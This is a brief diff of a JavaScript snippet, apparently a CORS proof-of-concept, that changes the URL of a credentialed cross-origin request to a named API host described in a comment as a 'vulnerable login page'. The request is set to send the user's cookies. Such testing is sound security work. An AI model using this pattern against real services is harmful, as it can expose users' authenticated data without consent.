@@ -40,7 +40,7 @@
             };
             
             // Set up the request to the vulnerable login page with credentials included
-            req.open('GET', 'https://vera-devel.api.verily.com/openapi.json', true);
+            req.open('GET', 'https://vera-devel.api.verily.com/', true);
             req.withCredentials = true; // Send credentials (like cookies) with the request
             req.send(); // Send the request
         };
